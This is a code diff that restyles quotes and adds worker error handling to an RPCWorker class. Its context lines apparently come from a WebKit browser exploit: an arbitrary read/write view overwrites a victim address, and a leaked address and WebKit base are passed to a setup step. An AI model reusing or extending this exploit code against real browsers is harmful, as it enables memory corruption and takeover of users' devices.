@@ -1,7 +1,7 @@
 //#region Classes
 class RPCWorker {
   constructor(name) {
-    if (typeof name !== "string") {
+    if (typeof name !== 'string') {
       throw new Error(`${name} not a valid name !!`);
     }
 
@@ -9,12 +9,20 @@ class RPCWorker {
     this.name = name;
     this.transfer = [];
     this.promises = new Map();
-    this.worker = new Worker("src/worker.js");
+    this.worker = new Worker('src/worker.js');
+
+    this.worker.onerror = (event) => {
+      const error = new Error(`Worker ${this.name} failed${event.message ? `: ${event.message}` : ''}`);
+      for (const promise of this.promises.values()) {
+        promise.reject(error);
+      }
+      this.promises.clear();
+    };
 
     this.worker.onmessage = (e) => {
       const { id, type, value } = e.data || {};
 
-      if (type === "log") {
+      if (type === 'log') {
         logger.log(value);
         return;
       }
@@ -25,10 +33,10 @@ class RPCWorker {
       this.promises.delete(id);
 
       switch (type) {
-        case "ret":
+        case 'ret':
           promise.resolve(value);
           break;
-        case "err":
+        case 'err':
           promise.reject(value);
           break;
       }
@@ -52,7 +60,7 @@ class RPCWorker {
   async init() {
     logger.debug(`initializing ${this.name}...`);
 
-    const marker_arr = await this.execute("init", this.name);
+    const marker_arr = await this.execute('init', this.name);
 
     const marker_buf_data = marker_arr.buffer.data();
     logger.debug(`marker_buf_data: ${marker_buf_data}`);
@@ -80,7 +88,7 @@ class RPCWorker {
 
     arw.view(master_addr).setBInt(0x10, victim_addr, true);
 
-    await this.execute("setup", leak_addr, webkit_base);
+    await this.execute('setup', leak_addr, webkit_base);
 
     logger.debug(`${this.name} initialized !!`);
   }
